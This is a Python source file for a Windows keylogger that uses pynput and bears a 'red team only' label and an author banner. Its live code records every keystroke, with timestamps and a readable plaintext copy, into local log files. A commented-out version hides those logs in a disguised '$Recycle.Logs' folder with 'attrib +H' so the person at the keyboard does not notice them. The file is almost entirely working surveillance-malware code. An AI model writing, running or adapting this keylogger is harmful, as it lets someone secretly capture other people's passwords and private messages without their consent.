# Top-secret script red team only DO NOT USE 
# import os
# import datetime
# import logging
# import time
# from pynput import keyboard
# from logging.handlers import RotatingFileHandler
# from threading import Timer
# import msvcrt
# import subprocess

# # === Configuration ===
# LOG_DIR = os.path.join(os.environ["USERPROFILE"], "$Recycle.Logs")
# os.makedirs(LOG_DIR, exist_ok=True)
# subprocess.run(["attrib", "+H", LOG_DIR], shell=True)

# DETAILED_LOG = os.path.join(LOG_DIR, "keylog_detailed.txt")
# PLAINTEXT_LOG = os.path.join(LOG_DIR, "keylogger_plaintext.txt")
# LOG_ROTATE = os.path.join(LOG_DIR, "keylogger_rfs.log")
# SESSION_START = datetime.datetime.now()

# MAX_RUNTIME_SECONDS = 6000  # ⏱️ Auto-stop after 6000 seconds

# # === Setup: File Initialization ===
# with open(DETAILED_LOG, "w") as f:
#     f.write("=== Keylogger Detailed Log ===\n")
#     f.write(f"Started at: {SESSION_START}\n\n")

# with open(PLAINTEXT_LOG, "w") as f:
#     f.write("=== Keylogger Plaintext Output ===\n")
#     f.write(f"Started at: {SESSION_START}\n\n")

# # === Rotating Logger Setup ===
# rfs_handler = RotatingFileHandler(LOG_ROTATE, maxBytes=500000, backupCount=3)
# formatter = logging.Formatter('%(asctime)s - %(message)s')
# rfs_handler.setFormatter(formatter)

# logger = logging.getLogger("KeyLogger")
# logger.setLevel(logging.INFO)
# logger.addHandler(rfs_handler)

# print("[INFO] Keylogger demo started. Logs are saved in a hidden folder.")
# print("[INFO] Press Ctrl + C to stop manually or wait for auto-stop.")

# # === Key Event Handler ===
# def on_press(key):
#     try:
#         key_text = key.char
#     except AttributeError:
#         key_text = f"[{key.name}]" if hasattr(key, 'name') else str(key)

#     # Detailed logging with timestamp
#     with open(DETAILED_LOG, "a") as f:
#         f.write(f"{datetime.datetime.now()} - {key_text}\n")

#     # Plaintext readable logging
#     with open(PLAINTEXT_LOG, "a") as f:
#         if key_text in ("[space]", "Key.space"):
#             f.write(" ")
#         elif key_text in ("[enter]", "Key.enter"):
#             f.write("\n")
#         elif key_text.startswith("["):
#             pass  # Skip special keys
#         else:
#             f.write(key_text)

#     # Rotating log
#     logger.info(f"Key pressed: {key_text}")

# # === Stop Listener Automatically ===
# def stop_keylogger():
#     print("[INFO] Auto-stop triggered. Stopping keylogger.")
#     listener.stop()

# # === Start Listener ===
# listener = keyboard.Listener(on_press=on_press)
# listener.start()

# stop_timer = Timer(MAX_RUNTIME_SECONDS, stop_keylogger)
# stop_timer.start()

# try:
#     while listener.running:
#         time.sleep(0.1)
# except KeyboardInterrupt:
#     print("\n[INFO] Ctrl + C received. Stopping keylogger.")
#     listener.stop()
# finally:
#     stop_timer.cancel()
#     if os.name == 'nt':
#         while msvcrt.kbhit():
#             msvcrt.getch()






print("\033[1;96m" + r"""
    )                           )                                                        
 ( /(                        ( /(                 (                                      
 )\())     )   (       (     )\())    (    (      )\         (  (    (  (      (    (    
((_)\   ( /(   )(     ))\  |((_)\    ))\   )\ )  ((_)   (    )\))(   )\))(    ))\   )(   
 _((_)  )(_)) (()\   /((_) |_ ((_)  /((_) (()/(   _     )\  ((_))\  ((_))\   /((_) (()\  
| || | ((_)_   ((_) (_))(  | |/ /  (_))    )(_)) | |   ((_)  (()(_)  (()(_) (_))    ((_) 
| __ | / _` | | '_| | || |   ' <   / -_)  | || | | |  / _ \ / _` |  / _` |  / -_)  | '_| 
|_||_| \__,_| |_|    \_,_|  _|\_\  \___|   \_, | |_|  \___/ \__, |  \__, |  \___|  |_|   :by haruki
                                           |__/             |___/   |___/               
""" + "\033[0m")

import os
import datetime
import logging
import time
from pynput import keyboard
from logging.handlers import RotatingFileHandler
from threading import Timer
import msvcrt

# === Configuration ===
LOG_DIR = "keylogger_logs"
os.makedirs(LOG_DIR, exist_ok=True)

DETAILED_LOG = os.path.join(LOG_DIR, "keylog_detailed.txt")
PLAINTEXT_LOG = os.path.join(LOG_DIR, "keylogger_plaintext.txt")
LOG_ROTATE = os.path.join(LOG_DIR, "keylogger_rfs.log")
SESSION_START = datetime.datetime.now()

MAX_RUNTIME_SECONDS = 6000  # ⏱️ Auto-stop after 6000 seconds

# === Setup: File Initialization =======
with open(DETAILED_LOG, "w") as f:
    f.write("=== Keylogger Detailed Log ===\n")
    f.write(f"Started at: {SESSION_START}\n\n")

with open(PLAINTEXT_LOG, "w") as f:
    f.write("=== Keylogger Plaintext Output ===\n")
    f.write(f"Started at: {SESSION_START}\n\n")

# === Rotating Logger Setup ===
rfs_handler = RotatingFileHandler(LOG_ROTATE, maxBytes=500000, backupCount=3)
formatter = logging.Formatter('%(asctime)s - %(message)s')
rfs_handler.setFormatter(formatter)

logger = logging.getLogger("KeyLogger")
logger.setLevel(logging.INFO)
logger.addHandler(rfs_handler)

print("[INFO] Keylogger demo started. Logs are saved in the 'keylogger_logs' folder.")
print("[INFO] Press Ctrl + C to stop manually or wait for auto-stop.")

# === Key Event Handler ===
def on_press(key):
    try:
        key_text = key.char
    except AttributeError:
        key_text = f"[{key.name}]" if hasattr(key, 'name') else str(key)

    with open(DETAILED_LOG, "a") as f:
        f.write(f"{datetime.datetime.now()} - {key_text}\n")

    with open(PLAINTEXT_LOG, "a") as f:
        if key_text in ("[space]", "Key.space"):
            f.write(" ")
        elif key_text in ("[enter]", "Key.enter"):
            f.write("\n")
        elif key_text.startswith("["):
            pass
        else: 
            f.write(key_text)

    logger.info(f"Key pressed: {key_text}")

# === Stop Listener Automatically ===
def stop_keylogger():
    print("[INFO] Auto-stop triggered. Stopping keylogger.")
    listener.stop()
# === Start Listener ===
listener = keyboard.Listener(on_press=on_press)
listener.start()

stop_timer = Timer(MAX_RUNTIME_SECONDS, stop_keylogger)
stop_timer.start()

try:
    while listener.running:
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[INFO] Ctrl + C received. Stopping keylogger.")
    listener.stop()
finally:
    stop_timer.cancel()

    # Clear out the input buffer if any key presses remain
    if os.name == 'nt':
        while msvcrt.kbhit():
            msvcrt.getch()





        